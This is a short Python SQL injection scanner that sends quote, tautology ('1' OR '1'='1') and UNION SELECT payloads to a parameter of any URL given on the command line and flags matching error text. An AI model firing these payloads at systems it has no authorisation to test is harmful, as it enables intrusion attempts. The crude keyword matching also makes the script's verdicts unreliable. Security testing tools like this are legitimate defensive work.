#!/usr/bin/env python3
"""SQL Injection Scanner - Tests parameters for SQL injection vulns."""

import requests
import sys
import urllib.parse

def test_sqli(url, param):
    """Test a parameter for SQL injection."""
    payloads = ["'", "1' OR '1'='1", "' OR 1=1 -- ", "1' UNION SELECT 1,2,3 -- "]
    
    for payload in payloads:
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if any(err in response.text.lower() for err in ['sql', 'mysql', 'sqlite', 'syntax', 'error']):
                print(f"VULNERABLE: {url} parameter '{param}' with payload '{payload}'")
                return True
        except requests.RequestException:
            continue
    return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python sql_injection_scanner.py <url> <param>")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    test_sqli(url, param)

if __name__ == "__main__":
    main()
